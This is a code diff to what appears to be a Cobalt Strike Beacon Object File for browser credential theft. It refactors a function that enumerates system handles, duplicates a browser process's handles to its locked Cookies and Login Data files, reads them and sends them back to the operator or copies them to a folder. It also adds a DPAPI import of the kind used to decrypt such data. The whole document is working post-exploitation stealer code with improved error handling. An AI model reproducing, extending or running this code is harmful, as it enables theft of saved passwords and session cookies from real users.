@@ -37,6 +37,8 @@ WINBASEAPI int __cdecl MSVCRT$memcmp(const void *_Buf1,const void *_Buf2,size_t 
 WINBASEAPI char* __cdecl  MSVCRT$strncpy (char * __dst, const char * __src, size_t __n);
 WINBASEAPI char* __cdecl  MSVCRT$strncat (char * _Dest,const char * _Source, size_t __n);
 DECLSPEC_IMPORT int WINAPI MSVCRT$strcmp(const char*, const char*);
+WINBASEAPI wchar_t *__cdecl MSVCRT$wcsncpy(wchar_t * __restrict__ _Dest, const wchar_t * __restrict__ _Source, size_t _Count);
+WINBASEAPI int __cdecl MSVCRT$_wcsicmp(const wchar_t *_Str1, const wchar_t *_Str2);
 WINBASEAPI BOOL  WINAPI   CRYPT32$CryptUnprotectData (DATA_BLOB *pDataIn, LPWSTR *ppszDataDescr, DATA_BLOB *pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct, DWORD dwFlags, DATA_BLOB *pDataOut);
 WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalFree (HGLOBAL hMem);
 WINBASEAPI HANDLE WINAPI  KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags,DWORD th32ProcessID);
@@ -704,133 +706,178 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
     SYSTEM_HANDLE_INFORMATION_EX *shi = NULL;
     DWORD dwNeeded = 0;
     DWORD dwSize = 0xffffff / 2;
+    BOOL result = FALSE;
+
+    // outside declaration
+    POBJECT_NAME_INFORMATION objectNameInfo = NULL;
+    PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = NULL;
+    HANDLE hDuplicate = NULL;
+    HANDLE hProc = NULL;
+    CHAR *buffer = NULL;
+
     shi = (SYSTEM_HANDLE_INFORMATION_EX *)KERNEL32$GlobalAlloc(GPTR, dwSize);
-    
+    if (!shi) {
+        BeaconPrintf(CALLBACK_ERROR, "GlobalAlloc failed for handle information.\n");
+        return FALSE;
+    }
+
     //utilize NtQueryStemInformation to list all handles on system
     NTSTATUS status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
-    if(status == STATUS_INFO_LENGTH_MISMATCH)
-    {
+    if (status == STATUS_INFO_LENGTH_MISMATCH) {
         dwSize = dwNeeded;
-        shi = (SYSTEM_HANDLE_INFORMATION_EX*)KERNEL32$GlobalReAlloc(shi, dwSize, GMEM_MOVEABLE);
-        if (dwSize == NULL)
-        {
+        // Only Assign on success
+        if ((shi = (SYSTEM_HANDLE_INFORMATION_EX*)KERNEL32$GlobalReAlloc(shi, dwSize, GMEM_MOVEABLE)) == NULL) {
             BeaconPrintf(CALLBACK_ERROR, "Failed to reallocate memory for handle information.\n");
             KERNEL32$GlobalFree(shi);
             return FALSE;
         }
     }
     status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
-    if(status != 0)
-    {
-        BeaconPrintf(CALLBACK_ERROR,"NtQuerySystemInformation failed with status 0x%x.\n",status);
+    if (status != 0) {
+        BeaconPrintf(CALLBACK_ERROR, "NtQuerySystemInformation failed with status 0x%x.\n", status);
         KERNEL32$GlobalFree(shi);
         return FALSE;
     }
     //BeaconPrintf(CALLBACK_OUTPUT,"Handle Count %d\n", shi->NumberOfHandles);
-    DWORD i = 0;
-    BOOL firstHandle = TRUE;
     //iterate through each handle and find our PID and a handle to a file
-    for(i = 0; i < shi->NumberOfHandles; i++) {
+    for (DWORD i = 0; i < shi->NumberOfHandles; i++) {
         SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
-        if((DWORD)(ULONG_PTR)handle.UniqueProcessId == PID) {
-            //BeaconPrintf(CALLBACK_OUTPUT, "Found PID");
-            POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)MSVCRT$malloc(0x1000);
-            ULONG returnLength = 0;
-            NTSTATUS ret = 0;
-            if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
-                HANDLE hProc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
-                if(hProc == INVALID_HANDLE_VALUE) {
-                    BeaconPrintf(CALLBACK_ERROR,"OpenProcess failed %d\n", KERNEL32$GetLastError());
-                    KERNEL32$GlobalFree(shi);
-                    MSVCRT$free(objectNameInfo);
-                    return FALSE;
-                }
+        if ((DWORD)(ULONG_PTR)handle.UniqueProcessId != PID) {
+            continue;
+        }
+        //BeaconPrintf(CALLBACK_OUTPUT, "Found PID");
+        if (handle.GrantedAccess == 0x001a019f) continue;
+        if (handle.HandleAttributes == 0x2 && handle.GrantedAccess == 0x0012019f) continue;
 
-                HANDLE hDuplicate = NULL;
-                if(!KERNEL32$DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, (HANDLE) -1, &hDuplicate, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
-                    //BeaconPrintf(CALLBACK_ERROR,"DuplicateHandle failed %d\n", KERNEL32$GetLastError());
-                    continue;                  
-                }
-                //Check if the handle exists on disk, otherwise the program will hang
-                DWORD fileType = KERNEL32$GetFileType(hDuplicate);
-                if (fileType != FILE_TYPE_DISK) {
-                    //BeaconPrintf(CALLBACK_ERROR, "NOT A FILE");
+        // reset per every iteration
+        if (objectNameInfo) { MSVCRT$free(objectNameInfo); objectNameInfo = NULL; }
+        if (objectTypeInfo) { MSVCRT$free(objectTypeInfo); objectTypeInfo = NULL; }
+        if (hDuplicate) { KERNEL32$CloseHandle(hDuplicate); hDuplicate = NULL; }
+        if (hProc) { KERNEL32$CloseHandle(hProc); hProc = NULL; }
+        if (buffer) { KERNEL32$GlobalFree(buffer); buffer = NULL; }
+
+        objectNameInfo = (POBJECT_NAME_INFORMATION)MSVCRT$malloc(0x1000);
+        objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)MSVCRT$malloc(0x1000);
+        if (!objectNameInfo || !objectTypeInfo) {
+            BeaconPrintf(CALLBACK_ERROR, "malloc failed\n");
+            continue;
+        }
+
+        hProc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
+        if (hProc == INVALID_HANDLE_VALUE) {
+            BeaconPrintf(CALLBACK_ERROR, "OpenProcess failed %d\n", KERNEL32$GetLastError());
+            continue;
+        }
+
+        if (!KERNEL32$DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, (HANDLE)-1, &hDuplicate, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
+            //BeaconPrintf(CALLBACK_ERROR,"DuplicateHandle failed %d\n", KERNEL32$GetLastError());
+            continue;
+        }
+
+        //Check if the handle exists on disk, otherwise the program will hang
+        if (KERNEL32$GetFileType(hDuplicate) != FILE_TYPE_DISK) {
+            //BeaconPrintf(CALLBACK_ERROR, "NOT A FILE");
+            continue;
+        }
+
+        ULONG returnLength = 0;
+        //BeaconPrintf(CALLBACK_OUTPUT,"Duplicated Handle, confirmed file on disk");
+        status = NTDLL$NtQueryObject(hDuplicate, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
+        if (status != 0) {
+            BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
+            continue;
+        }
+
+        if (objectNameInfo->Name.Length == 0) {
+            continue;
+        }
+
+        char handleName[1024];
+        MSVCRT$sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+
+        status = NTDLL$NtQueryObject(hDuplicate, ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
+        if (status != 0) {
+
+            BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
+            continue;
+        }
+
+        // extract type name properly
+        UNICODE_STRING *typeStr = &objectTypeInfo->TypeName;
+        WCHAR typeName[256] = {0};
+        int len = min(typeStr->Length / sizeof(WCHAR), 255);
+        MSVCRT$wcsncpy(typeName, typeStr->Buffer, len);
+        typeName[len] = L'\0'; // null terminated
+
+        if (MSVCRT$_wcsicmp(typeName, L"File") != 0) {
+            continue;
+        }
+        //BeaconPrintf(CALLBACK_OUTPUT, "%s\n", handleName);
+        //BeaconPrintf(CALLBACK_OUTPUT, "%d\n", MSVCRT$strlen(handleName));
+
+        // Check filename
+        if (MSVCRT$strstr(handleName, browserFile) != NULL) {
+            size_t nameLen = MSVCRT$strlen(handleName);
+            const char *ext7 = (nameLen >= 7) ? &handleName[nameLen - 7] : "";
+            const char *ext4 = (nameLen >= 4) ? &handleName[nameLen - 4] : "";
+
+            if (MSVCRT$strcmp(ext7, "Cookies") == 0 || MSVCRT$strcmp(ext4, "Data") == 0) {
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] Handle to %s Was FOUND with PID: %lu\n", browserFile, PID);
+                //BeaconPrintf(CALLBACK_OUTPUT, "Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+
+                KERNEL32$SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
+                DWORD dwFileSize = KERNEL32$GetFileSize(hDuplicate, NULL);
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] file size is %d\n", dwFileSize);
+
+                buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
+                if (!buffer) {
+                    BeaconPrintf(CALLBACK_ERROR, "Failed to allocate buffer\n");
                     continue;
                 }
-                //BeaconPrintf(CALLBACK_OUTPUT,"Duplicated Handle, confirmed file on disk");
-                ret = NTDLL$NtQueryObject(hDuplicate,ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
-                
-                if (ret != 0)
-                {
-                    BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
-                    KERNEL32$GlobalFree(shi);
-                    MSVCRT$free(objectNameInfo);
-                    return FALSE;
+
+                DWORD dwRead = 0;
+                // check if readfile failed
+                if (!KERNEL32$ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL)) {
+                    BeaconPrintf(CALLBACK_ERROR, "ReadFile failed\n");
+                    KERNEL32$GlobalFree(buffer);
+                    buffer = NULL;
+                    continue;
                 }
-                if (ret == 0 && objectNameInfo->Name.Length > 0){
-                    char handleName[1024];
-                    MSVCRT$sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
 
-                    PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)MSVCRT$malloc(0x1000);
-                    ret = NTDLL$NtQueryObject(hDuplicate,ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
-                    if (ret != 0)
-                    {
-                        BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
-                        KERNEL32$GlobalFree(shi);
-                        MSVCRT$free(objectTypeInfo);
-                        MSVCRT$free(objectNameInfo);
-                        return FALSE;
+                //if folder path is not null, then copy to folder instead of download_file()
+                if (MSVCRT$strcmp(folderPath, "") != 0) {
+                    CHAR copyFilePath[MAX_PATH];
+                    MSVCRT$sprintf(copyFilePath, "%s\\%s", folderPath, downloadFileName);
+                    HANDLE hFile = KERNEL32$CreateFileA(copyFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+                    if (hFile != INVALID_HANDLE_VALUE) {
+                        DWORD written = 0;
+                        KERNEL32$WriteFile(hFile, buffer, dwFileSize, &written, NULL);
+                        BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote password file to: %s\n", copyFilePath);
+                        KERNEL32$CloseHandle(hFile);
+                    } else {
+                        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to write password file to %s\n", copyFilePath);
                     }
-                    if (ret == 0 && (MSVCRT$strcmp(objectTypeInfo,"File"))){
-                        //BeaconPrintf(CALLBACK_OUTPUT, "%s\n", handleName);
-                        //BeaconPrintf(CALLBACK_OUTPUT, "%d\n", MSVCRT$strlen(handleName));
-                        if (MSVCRT$strstr(handleName, browserFile) != NULL && (MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 4], "Data") == 0 || MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 7], "Cookies") == 0)){
-
-                            BeaconPrintf(CALLBACK_OUTPUT,"[+] Handle to %s Was FOUND with PID: %lu\n", browserFile, PID);
-                            //BeaconPrintf(CALLBACK_OUTPUT, "Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
-
-                            KERNEL32$SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
-                            DWORD dwFileSize = KERNEL32$GetFileSize(hDuplicate, NULL);
-                            BeaconPrintf(CALLBACK_OUTPUT,"[+] file size is %d\n", dwFileSize);
-                            DWORD dwRead = 0;
-                            CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
-                            KERNEL32$ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
-
-                            //if folder path is not null, then copy to folder instead of download_file()
-                            if (MSVCRT$strcmp(folderPath, "") != 0){
-                                CHAR copyFilePath[MAX_PATH];
-                                MSVCRT$sprintf(copyFilePath, "%s\\%s", folderPath, downloadFileName);
-                                HANDLE hFile = KERNEL32$CreateFileA(copyFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-                    
-                                if (hFile == INVALID_HANDLE_VALUE) {
-                                    BeaconPrintf(CALLBACK_ERROR, "[!] Failed to write password file to %s\n", copyFilePath);
-                                } else {
-                                    DWORD written = 0;
-                                    KERNEL32$WriteFile(hFile, buffer, dwFileSize, &written, NULL);
-                                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote password file to: %s\n", copyFilePath);
-                                    KERNEL32$CloseHandle(hFile);
-                                }
-                            } else {
-                                download_file(downloadFileName,buffer, dwFileSize);
-                            }
-                            
-                            KERNEL32$GlobalFree(buffer);
-                            KERNEL32$GlobalFree(shi);
-                            MSVCRT$free(objectTypeInfo);
-                            MSVCRT$free(objectNameInfo);
-                            return TRUE;
-                        }
-                        
-                    }else{
-                        KERNEL32$CloseHandle(hDuplicate);
-                        MSVCRT$free(objectTypeInfo);
-                        MSVCRT$free(objectNameInfo);
-                    }
+                } else {
+                    download_file(downloadFileName, buffer, dwFileSize);
                 }
+
+                result = TRUE;
+                goto cleanup_and_exit;
             }
         }
     }
-    return FALSE;
+
+cleanup_and_exit:
+    //  clean up and free everything
+    if (buffer) KERNEL32$GlobalFree(buffer);
+    if (hDuplicate) KERNEL32$CloseHandle(hDuplicate);
+    if (hProc) KERNEL32$CloseHandle(hProc);
+    if (objectNameInfo) MSVCRT$free(objectNameInfo);
+    if (objectTypeInfo) MSVCRT$free(objectTypeInfo);
+    if (shi) KERNEL32$GlobalFree(shi);
+
+    return result;
 }
 
 // nanodump fileless download
